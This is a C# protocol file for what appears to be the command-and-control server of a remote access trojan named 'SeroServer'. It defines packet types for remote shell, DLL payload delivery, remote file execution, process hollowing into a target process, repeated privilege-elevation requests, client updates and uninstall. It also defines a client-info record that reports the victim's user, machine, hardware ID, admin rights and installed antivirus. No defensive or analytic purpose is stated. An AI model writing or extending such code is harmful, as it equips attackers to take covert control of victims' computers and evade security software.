using System.IO;
using Newtonsoft.Json;

namespace SeroServer.Protocol;

public enum PacketType
{
    // Client -> Server
    Heartbeat = 2,
    ClientInfo = 3,
    ShellOutput = 4,
    ElevationResult = 5,

    // Server -> Client
    HeartbeatAck = 11,
    Command = 12,
    DllPayload = 13,
    Disconnect = 14,
    RemoteShell = 20,
    RemoteFileExec = 21,
    Uninstall = 22,
    HollowExec = 23,
    UpdateClient = 24,
    RequestElevation = 30,
    RequestElevationLoop = 31,
    Ping = 32,
    Pong = 33,

}

public class Packet
{
    public PacketType Type { get; set; }
    public string Data { get; set; } = string.Empty;
    public long Timestamp { get; set; } = DateTimeOffset.UtcNow.ToUnixTimeSeconds();

    public byte[] Serialize()
    {
        var json = JsonConvert.SerializeObject(this);
        var jsonBytes = System.Text.Encoding.UTF8.GetBytes(json);
        var lengthBytes = BitConverter.GetBytes(jsonBytes.Length);
        var buffer = new byte[4 + jsonBytes.Length];
        Buffer.BlockCopy(lengthBytes, 0, buffer, 0, 4);
        Buffer.BlockCopy(jsonBytes, 0, buffer, 4, jsonBytes.Length);
        return buffer;
    }

    public static async Task<Packet?> ReadFromStreamAsync(Stream stream, CancellationToken ct = default)
    {
        // 60s timeout per packet read (enough for large file transfers)
        using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
        timeoutCts.CancelAfter(TimeSpan.FromSeconds(60));
        var token = timeoutCts.Token;

        var lengthBuf = new byte[4];
        int read = 0;
        while (read < 4)
        {
            int n = await stream.ReadAsync(lengthBuf.AsMemory(read, 4 - read), token);
            if (n == 0) return null;
            read += n;
        }

        int length = BitConverter.ToInt32(lengthBuf, 0);
        if (length <= 0 || length > 500 * 1024 * 1024) return null; // 500 MB max

        var dataBuf = new byte[length];
        read = 0;
        while (read < length)
        {
            int n = await stream.ReadAsync(dataBuf.AsMemory(read, length - read), token);
            if (n == 0) return null;
            read += n;
        }

        var json = System.Text.Encoding.UTF8.GetString(dataBuf);
        return JsonConvert.DeserializeObject<Packet>(json);
    }

    public static async Task WriteToStreamAsync(Stream stream, Packet packet, CancellationToken ct = default)
    {
        var data = packet.Serialize();
        await stream.WriteAsync(data, ct);
        await stream.FlushAsync(ct);
    }
}

// ── Data Classes ────────────────────────────────────

public class ClientInfoData
{
    public string OS { get; set; } = string.Empty;
    public string Username { get; set; } = string.Empty;
    public string MachineName { get; set; } = string.Empty;
    public string Hwid { get; set; } = string.Empty;
    public string IP { get; set; } = string.Empty;
    public string Payload { get; set; } = string.Empty;
    public string AuthKey { get; set; } = string.Empty;
    public bool IsAdmin { get; set; }
    public string Antivirus { get; set; } = string.Empty;
    public string IdPrefix { get; set; } = string.Empty;
    public string InstanceId { get; set; } = string.Empty;
}

public class ShellOutputData
{
    public string Output { get; set; } = string.Empty;
    public int ExitCode { get; set; }
}

public class RemoteFileExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

public class UpdateClientData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

public class HollowExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
    public string TargetProcess { get; set; } = string.Empty;
}

public class ElevationResultData
{
    public bool Success { get; set; }
    public string Message { get; set; } = string.Empty;
}

